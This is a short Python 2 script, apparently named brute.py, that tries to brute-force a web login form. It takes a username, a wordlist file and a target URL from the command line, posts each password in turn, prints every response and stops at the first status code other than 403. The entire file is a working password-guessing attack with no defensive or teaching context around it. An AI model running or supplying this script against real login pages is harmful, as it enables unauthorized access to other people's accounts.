import requests
import os, sys
import json


if len(sys.argv) <4:
	print "Too few arguments! Usage: python brute.py <username> <wordlist(one word per line)> URL"
	exit()
f = open(sys.argv[2])
wordlist = f.readlines()
size = len(wordlist)
i = 0
for word in wordlist:
	data = { 'username' : sys.argv[1],
		'password' : word.strip()}		
	resp = requests.post(sys.argv[3], data = data)
	print word
	print resp.text	
	
	if resp.status_code != 403:
		break
